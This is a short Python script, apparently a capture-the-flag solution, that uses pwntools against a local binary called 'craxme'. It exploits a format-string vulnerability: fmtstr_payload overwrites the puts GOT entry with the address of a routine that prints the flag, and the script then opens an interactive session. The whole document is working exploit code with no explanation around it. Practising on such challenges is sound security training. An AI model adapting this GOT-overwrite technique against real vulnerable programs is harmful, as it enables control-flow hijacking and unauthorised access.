#coding=utf-8
from pwn import *
p=process('./craxme')
elf=ELF('./craxme')
 
puts_got=elf.got['puts']
magic_addr=0x0804a038
cat_flag=0x080485D8 #or 0x080485F6
 
payload=fmtstr_payload(7,{puts_got:cat_flag })
 
p.recvuntil('magic :')
p.sendline(payload)
p.interactive()
